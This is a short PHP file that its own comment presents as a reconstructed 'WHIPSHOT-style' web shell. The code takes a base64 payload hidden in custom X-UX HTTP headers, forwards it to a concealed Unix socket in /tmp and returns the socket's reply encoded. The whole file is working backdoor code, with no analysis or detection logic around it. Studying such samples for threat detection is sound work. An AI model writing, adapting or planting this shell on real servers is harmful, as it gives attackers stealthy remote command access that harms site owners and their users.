<?php
// WHIPSHOT-style header-driven PHP web shell (reconstructed from published IOCs)
$hdr = $_SERVER['HTTP_X_UX'] ?? '';
$more = '';
for ($i=0; isset($_SERVER['HTTP_X_UX_'.$i]); $i++) { $more .= $_SERVER['HTTP_X_UX_'.$i]; }
$payload = base64_decode($hdr.$more);
$sock = fsockopen('unix:///tmp/.uxdport', 0, $en, $es, 5);
$lk = '/tmp/.uxdlock';
fwrite($sock, $payload);
echo base64_encode(fread($sock, 65535));
